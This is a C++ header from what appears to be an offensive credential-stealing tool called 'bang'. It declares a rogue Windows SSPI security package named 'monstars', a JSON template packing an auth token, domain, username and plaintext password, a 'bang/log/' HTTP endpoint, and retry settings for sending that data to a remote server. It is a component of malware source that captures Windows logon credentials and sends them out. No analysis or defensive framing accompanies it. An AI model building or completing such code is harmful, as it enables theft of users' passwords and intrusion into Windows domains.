#ifndef _BANG_CREDS_H_
#define _BANG_CREDS_H_

#define SECURITY_WIN32
#include <Windows.h>
#include <sspi.h>
#include <NTSecAPI.h>
#include <ntsecpkg.h>

#define STATUS_SUCCESS 0;

constexpr SEC_WCHAR c_PackageName[] = L"monstars";
constexpr SEC_WCHAR c_PackageComment[] = L"welcome to the jam!";
constexpr ULONG c_PackageCapabilities = SECPKG_FLAG_ACCEPT_WIN32_NAME | SECPKG_FLAG_CONNECTION;
constexpr USHORT c_PackageVersion = 1337;

constexpr wchar_t c_JsonTemplate[] =
    L"{\n"
    L"    \"auth_token\": \"%s\",\n"
    L"    \"domain\": \"%s\",\n"
    L"    \"username\": \"%s\",\n"
    L"    \"password\": \"%s\"\n"
    L"}";

constexpr wchar_t c_Endpoint[] = L"bang/log/";
constexpr wchar_t c_ContentType[] = L"Content-Type: application/json; charset=utf-16\r\n";

constexpr uint64_t c_ReauthCooldown = 5 * 1000;  // 5 seconds, in millisesconds
constexpr uint32_t c_ConnectAttempts = 5;
constexpr uint32_t c_RetryInterval = 30 * 1000;  // 30 seconds, in milliseconds

namespace bang
{

struct Creds
{
    wchar_t Domain[MAX_PATH];
    wchar_t User[MAX_PATH];
    wchar_t Password[MAX_PATH];
};

}

#endif  // _BANG_CREDS_H_